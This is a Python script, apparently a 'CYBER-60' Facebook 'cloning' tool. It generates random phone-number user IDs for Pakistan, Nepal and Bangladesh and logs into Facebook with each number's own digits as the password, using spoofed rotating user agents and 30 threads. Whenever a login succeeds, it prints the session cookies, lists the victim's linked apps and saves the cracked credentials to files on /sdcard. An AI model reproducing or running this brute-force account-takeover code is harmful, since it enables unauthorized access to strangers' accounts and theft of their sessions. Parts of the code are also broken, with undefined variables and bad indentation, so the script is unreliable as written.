from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python U-MAIL.py')
from bs4 import BeautifulSoup
ugen = []
A = '\x1b[1;97m'
B = '\x1b[1;96m'
C = '\x1b[1;91m'
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'
E = '\x1b[1;93m'
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;32m'
ORANGE = '\033[1;35m'
AHMADO = '{ AHMADO }'
for xd in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

loop = 0
cps = []
oks = []
twf = []
#os.system('xdg-open https://www.facebook.com/groups/258862096423615/')


def clear():
    os.system('clear')
    print(logo)
logo = """
\033[1;91m༄CYBER•───────────────────────────────────────•༄KING᭄

\033[1;91 ____ ___  _ ____  _____ ____ 
\033[1;33/   _\\  \///  __\/  __//  __\
\033[1;32|  /   \  / | | //|  \  |  \/|
\033[1;35|  \__ / /  | |_\\|  /_ |    /
\x1b[1;37\____//_/   \____/\____\\_/\_\
                              
                                                                
\033[1;91m▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄CYBER-60▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ 
\033[1;32m          ➠AUTHOR     ; ZIHAD ISLAM 
\033[1;33m          ➠FACEBOOK   ;ZIHAD ISLAM MEHEDI
\033[1;33m          ➠GITHUB     ; CYBER-31
\033[1;32m          ➠TOOLS      ;RANDOM BD CLONING
\x1b[1;37m          ➠KING       ;CYBER-60
\033[1;91m▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄CYBER-60▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ """




#####     ####




def linex():
    print(f'\033[1;35m༄CYBER•───────────────────────────────────────•༄KING᭄')
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mANTO-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mANTO-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mANTO-2F.txt' %
              (H, P, str(len(twf))))
        input("\x1b[1;97mPRESE ENTER TO BACK xyz  ")
        xyz()
loop = 0
cps = []
oks = []
twf = []
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS %s  '%(ORANGE))
    else:
        print(f'\r {GREEN}[•] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS %s'%(ORANGE))
    else:
        print(f'\r   %{Green}sYOUR EXPIRED APKS DETAILS :'%(Green))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
            print(f"{GREEN}[•]---------------------------------------------------[•]")
    #____________#
def Anto():
    os.system("play-audio WELCOME_TO_ANTO_BOOT_818.mp3")
    os.getuid
    os.system("clear");print(logo)
    print('           \x1b[97m[\033[1;33m  MAIN MENU   \033[0;m] ')
    print(f"")
    print(f"{ORANGE}[01] {YELLOW}RANDOM UID CLONING")
    print(f"{ORANGE}[00] {YELLOW}EXIT PROGRAM ")
    print(f"")
    print(f"\033[1;91m༄CYBER•───────────────────────────────────────•༄KING᭄")
    AHMADO = input("[•] CHOOSE : ")
    if AHMADO in ["1","01"]:
        Tabii()
    elif AHMADO in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\033[1;31m')
        Anto()

#==========================================================#

#========================================================== #

def Tabii():
    user=[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"")
    linex()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    print('  PAK CODE - 92306  92300  92315  92318  92345  ')
    print(f"CYBER-60───────────────────────────────────────•༄KING᭄")
    print(f" NEPAL CODE -  97797  97795  97781  97787")
    print(f"CYBER-60───────────────────────────────────────•༄KING᭄")
    print(f" BD CODE -  0197   0175  0189  0150  0143   0139   ")
    print(f"CYBER-60───────────────────────────────────────•༄KING᭄")
    print(f"")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
        print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[1;32m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 1000  2000  5000   10000   99999\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}"+tl)
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {BLUE}PAKISTAN")
        print(f" {WHITE}NUMBER YOU PUT        : {BLUE}"+code)
        print(f" {WHITE}PROCESS HAS BEEN STARTED")
#        print(f" {WHITE}BE PATIENT.......")
        print(f" {WHITE}TO STOP PROCESS CTRL + Z ")
        print(f'{YELLOW}༄CYBER-60•───────────────────────────────────────•༄KING᭄')
        for love in user:
            uid = code+love
            pwx = [love]
            yaari.submit(free,uid,pwx,tl)
def free(uid,pwx,tl):
    global loop
    global oks
    global agents
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
			'authority': 'www.facebook.com',
			'method': 'GET',
			'path': 'https://www.facebook.com/?_rdc=1&_rdr',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
			'referer': 'https://www.facebook.com/',
			'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'upgrade-insecure-requests': '1',
			'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\033[1;32m══════════════════════════════════════════')
                print('\r\033[1;32m[✓] STATUS   :CYBER-60_OK💉')
                print('\r\033[1;32m[✓] NUMBER    : '+uid+'  ')
                print('\r\033[1;32m[✓]PASSWORD     : '+ps+' ')
                print('\r\033[1;32m══════════════════════════════════════════')
                print('\r\033[1;32m[✓] USER COOKIES: '+coki+' ')
                print('\r\033[1;32m══════════════════════════════════════════')
                cek_apk(session,coki)
                open('/sdcard/CYBER-60-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(idf + '|' + pw)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[24:39]
                Green = '\033[1;32m'
                print('\r\033[1;32m══════════════════════════════════════════')
                print('\r\033[1;32m[✓] STATUS : CYBER-60_OK💉')
                print('\r\033[1;32m[✓] NUMBER    : ' +uid+ ' ')
                print('\r\033[1;91m[✓]PASSWORD     :' +ps+ ' ')
                print('\r\033[1;32m══════════════════════════════════════════')
                open('/sdcard/CYBER-60-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(idf + '|' + pw)
                break
            elif '/x/checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[7:22]
                Green= '\033[1;32m'
                print(f'\r{YELLOW}[TP-LOCK] '+cid+' | '+ps+'\033[1;97m')
                open('/sdcard/2F-😩.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x))
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass



if __name__ == '__main__':
    Anto()
